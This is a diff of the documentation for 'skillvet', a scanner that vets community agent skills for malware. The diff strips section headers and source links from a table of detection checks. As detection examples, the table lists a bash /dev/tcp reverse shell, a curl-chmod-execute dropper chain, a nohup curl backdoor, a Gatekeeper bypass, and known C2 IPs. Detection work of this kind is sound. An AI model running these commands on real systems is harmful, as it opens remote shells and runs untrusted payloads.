@@ -1,10 +1,7 @@
 ---
 name: skillvet
+version: 2.0.8
 description: Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection, obfuscation, homograph attacks, ANSI injection, campaign-specific attack patterns, and more before you install. Use when installing skills from ClawHub or any public marketplace, reviewing third-party agent skills for safety, or vetting untrusted code before giving it to your AI agent. Triggers: install skill, audit skill, check skill, vet skill, skill security, safe install, is this skill safe.
-compatibility: Requires bash, grep, find, and file. Optional: perl (fallback for grep -P on macOS). Works on Linux and macOS.
-metadata:
-  version: "3.1.0"
-  author: nathangit
 ---
 
 # Skillvet
@@ -145,13 +142,6 @@ Each finding has a severity weight (1-10). The aggregate risk score is included 
 | 22 | String construction evasion | String.fromCharCode, getattr, dynamic call assembly |
 | 23 | Data flow chain analysis | Same file reads secrets, encodes, AND sends network requests |
 | 24 | Time bomb detection | `Date.now() > timestamp`, `setTimeout(fn, 86400000)` |
-
-### Campaign-Inspired Checks (25-34)
-
-Inspired by [Koi Security research](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) which found 341 malicious skills on ClawHub.
-
-| # | Check | Example |
-|---|-------|---------|
 | 25 | Known C2/IOC IP blocklist | 91.92.242.30, 54.91.154.110 (known AMOS C2 servers) |
 | 26 | Password-protected archives | "extract using password: openclaw" — AV evasion |
 | 27 | Paste service payloads | glot.io, pastebin.com hosting malicious scripts |
@@ -162,23 +152,9 @@ Inspired by [Koi Security research](https://www.koi.ai/blog/clawhavoc-341-malici
 | 32 | Process persistence + network | `nohup curl ... &` — backdoor with network access |
 | 33 | Fake prerequisite pattern | "Prerequisites" section with sketchy external downloads |
 | 34 | xattr/chmod dropper | macOS Gatekeeper bypass: download, `xattr -c`, `chmod +x`, execute |
-
-### 1Password Blog-Inspired Checks (35-37)
-
-Inspired by [1Password research](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) on ClickFix-style attacks targeting agent skills.
-
-| # | Check | Example |
-|---|-------|---------|
 | 35 | ClickFix download+execute chain | `curl -o /tmp/x && chmod +x && ./x`, `open -a` with downloads |
 | 36 | Suspicious package sources | `pip install git+https://...`, npm from non-official registries |
 | 37 | Staged installer pattern | Fake dependency names like `openclaw-core`, `some-lib` |
-
-### Feb 2026 Campaign Checks (38-48)
-
-New patterns from [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and ongoing ClawHavoc campaign research.
-
-| # | Check | Example |
-|---|-------|---------|
 | 38 | Fake OS update social engineering | "Apple Software Update required for compatibility" |
 | 39 | Known malicious ClawHub actors | zaycv, Ddoy233, Sakaen736jih, Hightower6eu references |
 | 40 | Bash /dev/tcp reverse shell | `bash -i >/dev/tcp/IP/PORT 0>&1` (AuthTool pattern) |
